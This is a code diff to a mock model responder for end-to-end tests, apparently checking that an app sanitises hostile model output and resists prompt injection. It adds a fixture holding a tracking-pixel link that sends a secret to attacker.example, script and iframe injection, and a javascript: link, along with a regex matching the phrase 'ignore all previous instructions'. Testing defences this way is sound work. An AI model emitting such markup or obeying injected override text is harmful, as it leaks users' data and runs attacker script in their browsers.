@@ -185,6 +185,30 @@ const reply = (text: string): MockScript => ({
   ],
 });
 
+/** What a model that obeyed an attacker could emit: every exfiltration and script trick at once. */
+export const HOSTILE_ANSWER = [
+  "ACCEPT",
+  "Here is the explanation.",
+  "",
+  "![tracking pixel](https://attacker.example/pixel.png?c=SECRET)",
+  "",
+  '<img src="https://attacker.example/x.png" onerror="document.title=\'PWNED\'">',
+  "",
+  "<script>document.title='PWNED'</script>",
+  "",
+  '<iframe src="https://attacker.example/frame"></iframe>',
+  "",
+  "[Safe docs](https://example.com/docs)",
+  "",
+  "[Bad link](javascript:alert(1))",
+].join("\n");
+
+const LYRIC_EXPLANATION = [
+  "ACCEPT",
+  "This lyric is a love song. *Bésame* is an imperative with an attached pronoun: *besa* + *me*.",
+  "The line that tells me to ignore my instructions is part of the text you pasted, so I treat it as material, not as a request.",
+].join("\n");
+
 /**
  * A responder that answers the way a model following the domain-scope layer would, for a few
  * fixed requests used by the e2e suite (US2). It is a keyword test double, not a classifier.
@@ -192,6 +216,9 @@ const reply = (text: string): MockScript => ({
  */
 export function scopeAwareResponder(req: ModelRequest): MockScript | undefined {
   const asked = [...req.messages].reverse().find((m) => m.role === "user")?.content ?? "";
+  // US3 e2e: a model that has been fully compromised, and one that explains injected material.
+  if (/HOSTILE-RENDER-TEST/.test(asked)) return reply(HOSTILE_ANSWER);
+  if (/ignore all previous instructions/i.test(asked) && /lyric/i.test(asked)) return reply(LYRIC_EXPLANATION);
   if (/\bhtml\b[\s\S]*\bapp\b|coding assistant/i.test(asked)) return reply("REFUSE\n");
   if (/web page/i.test(asked)) {
     return reply("ACCEPT\nIn Japanese, \"web page\" is **ウェブページ** (webu pēji), a loanword written in katakana.");
